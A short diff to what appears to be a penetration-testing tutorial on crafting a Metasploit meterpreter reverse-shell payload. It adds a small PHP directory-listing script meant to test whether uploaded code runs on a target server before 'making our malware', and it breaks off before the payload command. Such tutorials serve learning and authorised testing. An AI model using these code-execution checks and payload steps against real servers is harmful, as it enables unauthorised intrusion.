@@ -74,6 +74,18 @@ As mentioned above, metasploit comes with a suite of tools for us to use for pen
 
 The payload we will be crafting will be built off of the `meterpreter` payload. This payload provides an interactive shell between the victim's machine and the attacker's machine. This shell will allow us to explore our target and execute commands on their device!
 
+Before we make our payload, we can use this simple script to see if we can actually run code on the server:
+
+    ```
+    <?php
+    $files = scandir(getcwd());
+    print_r($files);
+    ?>
+    ```
+Save this as a `.php` file and try to run it on the server!
+
+Once we confirmed this is possible, we can proceed with making our malware!
+
 1. To generate our payload, we will use the following command:
 
     ```
